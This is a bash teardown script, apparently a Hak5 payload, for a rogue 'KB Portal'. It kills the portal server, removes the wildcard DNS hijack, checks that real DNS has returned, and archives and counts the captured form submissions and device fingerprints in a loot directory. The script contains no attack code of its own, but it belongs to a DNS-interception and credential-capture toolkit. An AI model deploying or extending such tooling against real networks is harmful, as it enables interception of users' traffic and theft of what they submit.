#!/bin/bash
# Title: KB Portal Stop
# Description: Stops KB Portal: kills the server, removes the wildcard DNS drop, restarts dnsmasq, verifies real DNS returns, prints a capture summary. Undo is the product.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

LOG green "KB Portal Stop v1.0"
STATE=${KBP_STATE:-/root/loot/kb_portal}
MARKER="$STATE/active"

DNSINIT=${KBP_DNSINIT:-/etc/init.d/dnsmasq.hak5}
GENCONF=${KBP_GENCONF:-/var/etc/dnsmasq.conf.cfg*}
if [ ! -f "$MARKER" ]; then
  LOG yellow "no active portal marker - sweeping for stray drops anyway"
  CDDIR=$(grep -m1 '^conf-dir=' $GENCONF 2>/dev/null | head -1 | cut -d= -f2)
  if [ -n "$CDDIR" ] && ls "$CDDIR"/kbportal*.conf >/dev/null 2>&1; then
    rm -f "$CDDIR"/kbportal*.conf
    "$DNSINIT" restart >/dev/null 2>&1
    LOG green "stray kbportal drops removed, dnsmasq restarted"
    ALERT "Strays cleaned"
    exit 0
  fi
  if netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE ":80$"; then
    LOG yellow "NOTE: something still listens on :80 (not ours - leaving it)"
  fi
  ALERT "No portal active"
  exit 0
fi

PID=$(sed -n 's/^PID=//p' "$MARKER" | head -1)
DROP=$(sed -n 's/^DROP=//p' "$MARKER" | head -1)
TPL=$(sed -n 's/^TPL=//p' "$MARKER" | head -1)

if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
  kill "$PID" 2>/dev/null; sleep 1
  kill -0 "$PID" 2>/dev/null && kill -9 "$PID" 2>/dev/null
  LOG green "portal server stopped (pid $PID)"
else
  LOG yellow "server pid was already gone"
fi

DNSINIT=${KBP_DNSINIT:-/etc/init.d/dnsmasq.hak5}
DROPQ=$(sed -n 's/^DROPQ=//p' "$MARKER" | head -1)
[ -n "$DROPQ" ] && rm -f "$DROPQ"
if [ -n "$DROP" ] && [ -f "$DROP" ]; then
  rm -f "$DROP"
  "$DNSINIT" restart >/dev/null 2>&1
  LOG green "DNS drop removed + dnsmasq restarted"
  # verify real DNS returns: a .invalid name must give NXDOMAIN, not the portal IP
  PORTAL_IP=$(sed -n 's/^IP=//p' "$MARKER" | head -1)
  sleep 2
  # answer-section only: nslookup ALWAYS prints "Address: <server>" header, a raw
  # grep for the portal IP matched it -> permanent false WARNING (fixed 2026-09-07)
  if nslookup revert-check.invalid "$PORTAL_IP" 2>/dev/null | grep -A1 '^Name:' | grep -q "$PORTAL_IP"; then
    LOG red "WARNING: wildcard DNS STILL ACTIVE - restart dnsmasq manually"
    ALERT "DNS still captive!"
  else
    LOG green "DNS verified restored (NXDOMAIN returned, not hijacked)"
  fi
else
  LOG yellow "no drop file found - DNS may not have been captive"
fi

if [ -s /tmp/kbportal_capture.log ]; then
  cp /tmp/kbportal_capture.log "$STATE/$TPL-$(date -u +%Y%m%dT%H%M%SZ).log" 2>/dev/null \
    && LOG green "capture log archived to $STATE/" || LOG red "capture archive FAILED"
  : > /tmp/kbportal_capture.log 2>/dev/null
fi
if [ -s /tmp/kbportal_dns.log ]; then
  cp /tmp/kbportal_dns.log "$STATE/dns-$TPL-$(date -u +%Y%m%dT%H%M%SZ).log" 2>/dev/null \
    && LOG green "DNS query log archived to $STATE/" || LOG yellow "dns log copy failed"
  : > /tmp/kbportal_dns.log 2>/dev/null
fi
rm -f "$MARKER" "$STATE/uhttpd.pid" 2>/dev/null

LOG cyan "capture summary:"
# newest archived capture for this template (archive glob, wc-safe counts)
CAPLOG=$(ls -t "$STATE/$TPL-"*.log 2>/dev/null | head -1)
if [ -n "$CAPLOG" ] && [ -f "$CAPLOG" ]; then
  LINES=$(wc -l < "$CAPLOG")
  POSTS=$(grep "^POST " "$CAPLOG" 2>/dev/null | wc -l)
  FPS=$(grep "^FP " "$CAPLOG" 2>/dev/null | wc -l)
  LOG green "$CAPLOG: $LINES requests, $POSTS form submissions, $FPS fingerprints"
else
  LOG yellow "no capture log for $TPL"
fi
ALERT "Portal stopped, DNS clean"
exit 0
